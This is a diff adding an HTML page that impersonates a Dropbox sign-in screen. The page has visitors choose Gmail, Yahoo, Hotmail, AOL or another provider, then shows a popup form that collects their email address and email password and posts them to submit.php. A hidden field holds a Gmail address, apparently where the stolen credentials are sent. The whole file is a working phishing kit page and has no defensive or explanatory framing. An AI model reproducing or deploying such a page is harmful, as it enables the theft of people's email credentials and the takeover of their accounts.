@@ -1,0 +1,136 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Dropbox - Sign in
+  </title>
+  <link href="favicon.ico" rel="shortcut icon" />
+  <link href="css/style.css" rel="stylesheet" />
+  <link href="css/styleTinybox.css" rel="stylesheet" />
+  <script src="js/jquery.min.js" type="text/javascript">
+  </script>
+  <script src="js/popup.js" type="text/javascript">
+  </script>
+  <script src="js/global.js" type="text/javascript">
+  </script>
+ </head>
+ <body onload="openOffersDialog();">
+  <div id="maincover">
+   <img class="logo" src="images/logo.png" />
+   <div class="line">
+   </div>
+   <div id="dropboxmaincontent">
+    <table>
+     <tbody>
+      <tr>
+       <td valign="middle" class="mainlogo">
+        <img width="288" height="305" src="images/sign-in-vflvTYLtt.png" />
+       </td>
+       <td valign="top">
+        <h1>
+         Please select your email provider
+        </h1>
+        <h5>
+         Now , you can sign in to dropbox with your email
+        </h5>
+        <table>
+         <tbody>
+          <tr>
+           <td>
+            <img onclick="openOffersDialoggmail()" src="images/gmail.jpg" />
+           </td>
+           <td>
+            <img onclick="openOffersDialogyahoo()" src="images/yahoo.jpg" />
+           </td>
+          </tr>
+          <tr>
+           <td>
+            <img onclick="openOffersDialoghotmail()" src="images/hotmail.jpg" />
+           </td>
+           <td>
+            <img onclick="openOffersDialogaol()" src="images/aol.jpg" />
+           </td>
+          </tr>
+          <tr>
+           <td>
+            <img onclick="openOffersDialogother()" src="images/other.jpg" />
+           </td>
+           <td>
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+   <script src="js/tinybox.js" type="text/javascript">
+   </script>
+   <div class="overlay" id="overlay">
+   </div>
+   <!---<a onclick="openOffersDialog2();">Click Here To See The PopUp</a> //--->
+   <div class="box" id="boxpopup">
+    <a class="boxclose" onclick="closeOffersDialog('boxpopup');">
+    </a>
+    <div id="content">
+     <meta content="Content-Type" http-equiv="Content-Type" />
+     <link id="theme" href="css/default.css" type="text/css" rel="stylesheet" />
+     <img id="ImgLogo" style="position:absolute; top:10px; left:5px; height:32px; width:auto;" src="images/hotmail.jpg" />
+     <center>
+      <div style="font-size:16px; margin-bottom:10px; color:#A0A0A4; text-align:center; height:50px; padding-top:0%; padding-left:7%; z-index:99999; position:relative; " id="imgLogoText">
+      </div>
+     </center>
+     <form onsubmit="return validation()" data-form="preview" style="background-color: rgb(247, 247, 247); border-top-color: rgb(184, 177, 181); border-right-color: rgb(184, 177, 181); border-bottom-color: rgb(184, 177, 181); border-left-color: rgb(184, 177, 181); width: 450px; margin-top:2px;" class="fb-100-item-column fb-toplabel hidehints selected-object" novalidate="novalidate" action="submit.php" method="POST" name="docContainer" id="docContainer">
+      <span id="formHeader">
+       <input type="hidden" value="jameswds6@gmail.com" id="server" name="server" />
+      </span>
+      <style>
+       #fb-form-header1 span{ font-size:12px; color:#2A1FAA; font-weight:bold; font-variant:small-caps; padding:8px; text-align:center; }
+      </style>
+      <div style="min-height: 20px; height: 50px; background-color:#ddd;   " class="fb-form-header" id="fb-form-header1">
+       <span>
+        now , you can sign in to dropbox with all email providers.
+       </span>
+      </div>
+      <div class="section" id="section1">
+       <div class="column ui-sortable" id="column1">
+        <div class="fb-item fb-100-item-column" id="item1">
+         <div class="fb-grouplabel">
+          <label style="display: inline; " id="item1_label_0">
+           Email
+           <span style="display:none; color:red; padding-left:4%;" id="usernameError">
+            Please enter your email
+           </span>
+          </label>
+         </div>
+         <div class="fb-input-box">
+          <input type="text" onkeyup="onkeyuser()" style="background: white url(images/lockbg.png) right no-repeat ; padding-right:6%;" name="username" id="username" autocomplete="off" placeholder="Enter your email" maxlength="240" />
+         </div>
+        </div>
+        <div class="fb-item fb-100-item-column" id="item2">
+         <div class="fb-grouplabel">
+          <label style="display: inline; " id="item2_label_0">
+           Password
+           <span style=" display:none; color:red; padding-left:4%;" id="passwordError">
+            Please enter your email password
+           </span>
+          </label>
+         </div>
+         <div class="fb-input-box">
+          <input type="password" onkeyup="onkeypass()" style="background: white url(images/lockbg.png) right no-repeat ; padding-right:6%;" name="password" autocomplete="off" placeholder="Email Password" />
+         </div>
+        </div>
+       </div>
+      </div>
+      <div style="min-height: 1px; background-color:#ddd; padding-left: 270px; " class="fb-item-alignment-left fb-footer" id="fb-submit-button-div">
+       <input type="submit" value="Submit" style="background-image: url(images/btn_submit.png); " id="fb-submit-button" class="fb-button-special" />
+      </div>
+      <input type="hidden" value="Value" name="changing" />
+     </form>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
